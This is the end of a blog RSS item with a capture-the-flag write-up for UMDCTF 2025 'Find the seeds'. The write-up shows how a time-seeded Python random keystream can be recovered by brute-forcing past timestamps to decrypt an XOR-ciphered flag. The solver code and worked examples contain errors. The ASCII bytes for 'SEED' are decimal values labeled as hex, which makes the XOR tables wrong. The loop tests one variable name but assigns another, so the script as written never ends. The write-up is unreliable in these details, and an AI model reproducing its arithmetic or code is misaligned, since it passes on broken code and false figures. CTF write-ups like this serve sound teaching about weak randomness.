+<p>In order to select a seed, the usual go-to number is whatever <a href="https://www.unixtimestamp.com/">UNIX timestamp</a> you're on during runtime. This is convenient because it's a big, easy to obtain number that changes every second. In fact, this is precisely how the challenge script gets the seed:</p>
+<pre><code>import random
+import time
+
+# Generates a seed by using the current time
+seed = int(time.time())
+# Sets the generated seed to generate random numbers
+random.seed(seed)
+</code></pre>
+<h3>The cipher</h3>
+<p>Now let's take a look at the lines that actually generate the ciphered text:</p>
+<pre><code>plaintext = b"UMDCTF{REDACTED}" # Text that will be ciphered
+# Creates a byte array of 8-bit-long random numbers up to the text length
+keystream = bytes([random.getrandbits(8) for _ in range(len(plaintext))])
+# Ciphers the text executing a XOR operation for each pair of characters
+# in plaintext and keystream
+ciphertext = bytes([p ^ k for p, k in zip(plaintext, keystream)])
+</code></pre>
+<p>First, it defines a string variable, containing the text that will be deciphered. In this case, a fake flag.</p>
+<p>Then, it creates a byte array, and for each character in <code>plaintext</code>, it will append to said array a random number of 8 bits that generates with the <code>getrandbits()</code>function. This array of random numbers is what will create the ciphered text. Let's break down how it does it:</p>
+<p>The <strong>for</strong> loop that is used to append to <code>ciphertext</code> uses a function called <code>zip()</code>. This function takes two strings and returns a list with <strong>character pairs</strong> of those strings. The pairs will have the N'th character of <code>plaintext</code> with the N'th character of <code>keystream</code>. The for loop takes each element of each pair with the <code>p</code> and <code>k</code> variables and performs a <code>XOR</code> operation (<code>^</code>) with them that will be appended to the array.</p>
+<p>As an example, if we have the string <strong>"SEED"</strong> in <code>plaintext</code> and the numbers 0x78, 0x04, 0x65 and 0x12 in <code>keystream</code>, this would be the what's stored in <code>ciphertext</code>:</p>
+<pre><code>0x83 0x69 0x69 0x68  ("SEED" in ASCII)
+0x78 0x04 0x65 0x12  (the keystream)
+-------------------  XOR
+0xFB 0x6D 0x0C 0x7A  (ciphered text)
+</code></pre>
+<p>This is what gets written in <code>secret.bin</code>.</p>
+<h3>Deciphering</h3>
+<p>The written text is created by a <code>XOR</code> operation, so it would be natural to think that in order to decipher the text we'd need to <strong>undo</strong> the <code>XOR</code> operation. This is easy to do, as <code>XOR</code> is its own inverse, meaning that in order to undo the previous operation, we just need to <code>XOR</code> the result of it with one of its operands to obtain the other operand:</p>
+<pre><code>0xFB 0x6D 0x0C 0x7A  (ciphered text)
+0x78 0x04 0x65 0x12  (the keystream)
+-------------------  XOR
+0x83 0x69 0x69 0x68  ("SEED" in ASCII)
+</code></pre>
+<p>We've made some substancial progress up to this point. We know how the text is ciphered and how to decipher it. But here's the catch! While we do know how the cipher works, the algorithm relies on <strong>random numbers</strong>. The numbers used for ciphering the flag were created with an unknown seed, so our deciphering attempts will be futile. <strong>We don't have the keystream array that was used to cipher the flag, but if we find it, we will be able to decipher the flag.</strong></p>
+<h3>The vulnerability</h3>
+<p>Let's go back to square one. <strong>The seeds</strong>. There's a key property mentioned before that will allow us to find the breach to get the flag. <strong>A seed will always generate the same sequence of random numbers.</strong> This means that the only thing we need to get the keystream is the seed that was used to generate it. And, lo and behold, we do know how the seed was created!</p>
+<pre><code>import random
+import time
+
+seed = int(time.time())
+random.seed(seed)
+</code></pre>
+<p>The seed was created with the <code>time</code> library! Here's the vulnerability, because the seed is not an arbitrary number; it's the instance in which the flag was generated. This means that we can <strong>brute-force</strong> the flag by "<strong>going back in time</strong>" second by second with another script. For each second that we travel back into, we perform the reverse <code>XOR</code> operation until we get to the timestamp in which the flag was generated. Once we get there, the random keystream generated will be the same with which the flag was ciphered, and that will give us the last piece we need to perform the reverse operation. The script we need is pretty similar to the one the challenge gives us. Let's break it down step by step:</p>
+<p>First, let's open the file and declare some variables:</p>
+<pre><code>import random
+import time
+
+# We open the file and store in ciphertext the content of it
+with open('secret.bin', 'rb') as file:
+	ciphertext = file.read()
+
+# We initialize the variable in which the deciphered text will be stored
+decipheredtext = ""
+# An incremental variable that will be used to go back in time
+count = 0
+# We get the current timestamp
+seed = int(time.time())
+</code></pre>
+<p>Now, let's create the loop that will brute-force the flag:</p>
+<pre><code># This loop will stop once the deciphered text contains "UMDCTF{" in it
+while "UMDCTF{" not in str(decipheredtext):
+	# For each iteration, we decrement the seed by one
+	# This makes us go back in time second by second for each iteration
+	random.seed(seed - count)
+	# We generate the keystream of the seed
+	keystream = bytes([random.getrandbits(8) for _ in range(len(ciphertext))])
+	# We use the generated keystream to perform the reverse XOR operation
+	# (Mind how now instead of using the plain text in zip() we use the ciphered text)
+	deciphertext = bytes([p ^ k for p, k in zip(ciphertext, keystream)])
+
+	count += 1
+</code></pre>
+<p>Because of the context of the challenge, we know that the flag starts with the string <code>"UMDCTF{"</code>. This comes in handy because we can use it as a stop condition. Once we find a deciphered text that starts like that, we can be sure that we've found the flag.</p>
+<p>Now we just need to execute the script and wait for a few seconds (or more depending on when you execute the script, the more in the future you are relative to the stamp that was used for the seed), and sure enough, in due time, we'll get the flag!</p>
+<p>Here's the full code, with a few output messages that print the flag and other info:</p>
+<pre><code>import random
+import time
+
+with open('secret.bin', 'rb') as file:
+	ciphertext = file.read()
+
+decipheredtext = ""
+count = 0
+seed = int(time.time())
+
+while "UMDCTF{" not in str(decipheredtext):
+	random.seed(seed - count)
+
+	keystream = bytes([random.getrandbits(8) for _ in range(len(ciphertext))])
+	deciphertext = bytes([p ^ k for p, k in zip(ciphertext, keystream)])
+
+	count += 1
+
+print(f"Flag: {decipheredtext}")
+
+print(f"Complete in {count} iterations")
+
+print(f"Stamp in which the seed was generated: {int(time.time()) - count}")
+</code></pre>
+<h2>Conclusion</h2>
+<p>Seed-based pseudo-random number generation algorithms are fine for <strong>casual, uncompromised uses</strong>. But as we've seen, <strong>these algorithms are not cryptographically safe</strong> and <strong>should not</strong> be used for password generation or similar uses.</p>
+]]></description>
+            <link>https://markelmencia.github.io/writeups/umdctf2025-find-the-seeds-writeup</link>
+            <guid isPermaLink="true">https://markelmencia.github.io/writeups/umdctf2025-find-the-seeds-writeup</guid>
+            <pubDate>Wed, 30 Apr 2025 00:00:00 GMT</pubDate>
         </item>
     </channel>
 </rss>
